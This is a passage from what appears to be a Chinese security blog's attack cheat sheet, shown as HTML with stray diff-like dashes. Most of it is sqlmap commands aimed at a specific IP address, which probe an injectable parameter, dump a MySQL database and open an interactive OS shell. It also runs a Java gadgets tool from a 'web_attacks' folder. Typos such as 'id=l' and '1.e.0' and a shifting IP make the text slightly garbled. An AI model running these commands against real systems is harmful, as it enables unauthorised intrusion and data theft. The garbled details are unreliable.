-<h4 id="5：自动化SQL注入"><a href="#5：自动化SQL注入" class="headerlink" title="5：自动化SQL注入"></a>5：自动化SQL注入</h4><pre><code class="shell">sqlmap -u http://18.11.8.22/debug.php?id=1 -p "id"  #-p指定注入点存在位置
-sqlmap -u http://18.11.8.22/debug.php?id=l -p "id" --dbms=mysql --dump #--dbms指定数据库类型 --dump导出数据
-sqlmap -u http://18.11.9.22/debug.php?id=l -p "id" --dbms=mysql --os-shell #--os-shell获取交互式shell</code></pre>
-<h1 id="八：额外程序"><a href="#八：额外程序" class="headerlink" title="八：额外程序"></a>八：额外程序</h1><pre><code class="shell">C:\tools\web_attacks&gt;java -jar gadgets-1.e.0.jar</code></pre>
-<p>未完待续…</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
